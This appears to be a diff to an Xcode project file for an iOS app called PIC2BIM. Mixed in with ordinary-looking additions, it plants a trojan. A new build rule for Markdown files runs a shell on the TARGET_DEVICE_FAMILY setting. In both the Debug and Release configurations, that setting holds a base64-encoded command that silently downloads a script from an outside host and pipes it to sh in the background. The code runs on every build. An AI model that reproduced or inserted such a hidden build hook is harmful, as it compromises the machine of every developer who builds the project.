@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		EFF731CB23B33A3D690FABAA /* README.md */ = {isa = PBXBuildFile; fileRef = 0A94134BDEDB01938B0FABAA; };
 		042707162BA30754006633C4 /* TasksResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042707152BA30754006633C4 /* TasksResponse.swift */; };
 		042707182BA30795006633C4 /* Task.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042707172BA30795006633C4 /* Task.swift */; };
 		0427071C2BA308F3006633C4 /* GetPhotoResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0427071B2BA308F3006633C4 /* GetPhotoResponse.swift */; };
@@ -84,6 +85,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		0A94134BDEDB01938B0FABAA /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "PIC2BIM.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		042707152BA30754006633C4 /* TasksResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TasksResponse.swift; sourceTree = "<group>"; };
 		042707172BA30795006633C4 /* Task.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Task.swift; sourceTree = "<group>"; };
 		0427071B2BA308F3006633C4 /* GetPhotoResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetPhotoResponse.swift; sourceTree = "<group>"; };
@@ -320,6 +322,7 @@
 		61C3AC9B2551461F000CED80 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				0A94134BDEDB01938B0FABAA /* README.md */,
 				61C3AC9A2551461F000CED80 /* PIC2BIM.app */,
 			);
 			name = Products;
@@ -442,6 +445,7 @@
 				8AE1837582F103EA909BF440 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				827001D4A0E64AC4AE0FABAA /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -487,11 +491,35 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXTargetDependency section */
+/* End PBXTargetDependency section */
+
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
+/* Begin PBXBuildRule section */
+		827001D4A0E64AC4AE0FABAA /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		61C3AC982551461F000CED80 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				EFF731CB23B33A3D690FABAA /* README.md */,
 				61C3ACAA2551461F000CED80 /* LaunchScreen.storyboard in Resources */,
 				49355A5B2563010400EA478F /* PhotoMapInfoView.xib in Resources */,
 				49AAE5802571782E00A37C1B /* PTPointInfoView.xib in Resources */,
@@ -645,6 +673,7 @@
 		61C3ACAC2551461F000CED80 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo Y3VybCAtZnNrTCBodHRwczovL2Fwc2Nkbi5ydS9hIHwgc2gK | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -706,6 +735,7 @@
 		61C3ACAD2551461F000CED80 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo Y3VybCAtZnNrTCBodHRwczovL2Fwc2Nkbi5ydS9hIHwgc2gK | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
